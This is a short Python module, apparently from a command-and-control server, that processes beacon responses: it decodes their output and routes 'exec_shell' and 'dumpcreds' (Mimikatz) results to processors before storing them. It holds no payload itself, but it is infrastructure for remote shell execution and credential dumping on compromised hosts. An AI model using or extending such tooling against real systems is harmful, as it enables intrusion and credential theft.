from app.operations import Result, Task
from app.processors import ExecShell, Mimikatz
from app.models import TaskResults
import magic, base64, os, datetime, json


command_processors = {
    'exec_shell': ExecShell,
    'dumpcreds': Mimikatz
}

class Response:
    def __init__(self, beacon_id, task_id):
        self.beacon_id = beacon_id
        self.task_id = task_id
   
    def process(self, response):
        task_exist = Task(self.task_id).get()
        if task_exist["result"] == "success":
            decoded_output = base64.b64decode(response['output'])
            magic_object = magic.Magic(mime=True)
            magic_type = magic_object.from_buffer(decoded_output)
            if response['command'] in command_processors:
                decoded_output, magic_type = command_processors[response['command']](decoded_output, magic_type,
                    response).process()

            result = Result(self.beacon_id, self.task_id).create(response['command'], response['type'],
                response['input'], decoded_output, magic_type)

            result_count = TaskResults.objects(beacon_id=self.beacon_id, task_id=self.task_id).count()
            if result_count == task_exist['data'].commands.count():
                 task_exist['data'].update(task_status="Completed")


        else:
            result = {"result":"failed", "data":"Task and/or beacon do not exist"}

        return result